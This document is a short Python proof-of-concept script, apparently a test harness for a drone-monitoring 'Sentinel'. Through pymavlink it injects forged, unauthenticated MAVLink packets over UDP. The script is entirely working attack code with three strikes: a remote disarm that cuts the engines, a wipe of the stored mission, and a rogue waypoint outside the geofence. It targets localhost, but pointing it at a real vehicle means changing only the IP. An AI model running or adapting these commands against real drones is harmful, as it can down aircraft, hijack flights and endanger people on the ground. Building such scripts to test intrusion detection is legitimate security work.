"""
attacker.py - Proof-of-Concept Exploit Injection Tool.
"""

import time
import socket
from pymavlink import mavutil

SENTINEL_IP = "127.0.0.1"
SENTINEL_PORT = 14551

def launch_attack():
    print("==================================================")
    print("          CYBER ATTACK EXPLOIT INJECTOR           ")
    print("==================================================")
    print(f"[*] Targeting Sentinel on UDP: {SENTINEL_IP}:{SENTINEL_PORT}")
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    mav = mavutil.mavlink.MAVLink(None, srcSystem=255, srcComponent=1)
    time.sleep(1)

    # Attack 1: Remote Engine Kill (Disarm)
    print("\n[!] STRIKE 1: Injecting Unauthorized DISARM (Remote Engine Cutoff)...")
    cmd_disarm = mav.command_long_encode(
        1, 1,
        mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM,
        0,
        0,  # Disarm
        0, 0, 0, 0, 0, 0
    )
    sock.sendto(cmd_disarm.pack(mav), (SENTINEL_IP, SENTINEL_PORT))
    print("[+] Packet Dispatched: MAV_CMD_COMPONENT_ARM_DISARM (Param1=0)")

    time.sleep(2)

    # Attack 2: Mission Wipe (Using standard MAVLink mission_clear_all)
    print("\n[!] STRIKE 2: Injecting Mission Memory Wipe...")
    cmd_wipe = mav.mission_clear_all_encode(1, 1)
    sock.sendto(cmd_wipe.pack(mav), (SENTINEL_IP, SENTINEL_PORT))
    print("[+] Packet Dispatched: MISSION_CLEAR_ALL")

    time.sleep(2)

    # Attack 3: Geofence Breach
    print("\n[!] STRIKE 3: Injecting Rogue Waypoint outside authorized bounds...")
    cmd_waypoint = mav.mission_item_encode(
        1, 1, 0,
        mavutil.mavlink.MAV_FRAME_GLOBAL,
        mavutil.mavlink.MAV_CMD_NAV_WAYPOINT,
        0, 1, 0, 0, 0, 0,
        50.0,  # Rogue latitude (outside geofence)
        50.0,  # Rogue longitude (outside geofence)
        10
    )
    sock.sendto(cmd_waypoint.pack(mav), (SENTINEL_IP, SENTINEL_PORT))
    print("[+] Packet Dispatched: MISSION_ITEM (Lat: 50.0, Lon: 50.0)")
    print("\n[*] All 3 exploits dispatched successfully!")

if __name__ == "__main__":
    launch_attack()